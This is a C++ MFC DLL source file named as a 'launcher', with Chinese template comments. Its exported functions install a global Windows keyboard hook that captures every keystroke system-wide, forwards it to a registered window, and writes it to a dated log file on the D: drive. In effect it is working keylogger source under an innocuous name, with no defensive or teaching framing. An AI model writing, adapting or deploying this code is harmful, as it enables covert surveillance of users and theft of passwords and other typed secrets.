// LaunchDll.cpp : 定义 DLL 的初始化例程。
//

#include "stdafx.h"
#include "LaunchDll.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//
//TODO:  如果此 DLL 相对于 MFC DLL 是动态链接的，
//		则从此 DLL 导出的任何调入
//		MFC 的函数必须将 AFX_MANAGE_STATE 宏添加到
//		该函数的最前面。
//
//		例如: 
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// 此处为普通函数体
//		}
//
//		此宏先于任何 MFC 调用
//		出现在每个函数中十分重要。  这意味着
//		它必须作为函数中的第一个语句
//		出现，甚至先于所有对象变量声明，
//		这是因为它们的构造函数可能生成 MFC
//		DLL 调用。
//
//		有关其他详细信息，
//		请参阅 MFC 技术说明 33 和 58。
//

// CLaunchDllApp

BEGIN_MESSAGE_MAP(CLaunchDllApp, CWinApp)
END_MESSAGE_MAP()


// CLaunchDllApp 构造

CLaunchDllApp::CLaunchDllApp()
{
	// TODO:  在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的一个 CLaunchDllApp 对象

CLaunchDllApp theApp;


// CLaunchDllApp 初始化

BOOL CLaunchDllApp::InitInstance()
{
	CWinApp::InitInstance();

	return TRUE;
}


DllExport void WINAPI InstallLaunchEv()
{
	Hook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD,
		(HOOKPROC)LauncherHook,
		theApp.m_hInstance,
		0);
}
DllExport void RegistMsg(HWND hwnd, long msg)
{
	hWnd = hwnd;
	Msg = msg;
}
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	LRESULT Result = CallNextHookEx(Hook, nCode, wParam, lParam);
	if (nCode == HC_ACTION)
	{
		if (wParam == 0x10)//shift
		{
			if (lParam & 0x80000000)//keyup
			{
				shift = false;
			}
			else
				shift = true;
			return Result;
		}
		if (lParam & 0x80000000)
		{
			char c[1];
			c[0] = wParam;
			if (!shift && (c[0]>=0x41) && (c[0]<=0x5A)) {
				c[0] += 0x20;
			}
			//发送消息
			if (Msg)
			{
				PostMessage(hWnd, Msg, (WPARAM)c[0], lParam);
			}
			SaveLog(c);
		}
	}
	return Result;
}

void SaveLog(char* c)
{
	CTime tm = CTime::GetCurrentTime();
	CString name;
	name.Format("D://Key_%d_%d.log", tm.GetMonth(), tm.GetDay());
	CFile file;
	if (!file.Open(name, CFile::modeReadWrite))
	{
		file.Open(name, CFile::modeCreate | CFile::modeReadWrite);
	}
	file.SeekToEnd();
	file.Write(c, 1);
	file.Close();
}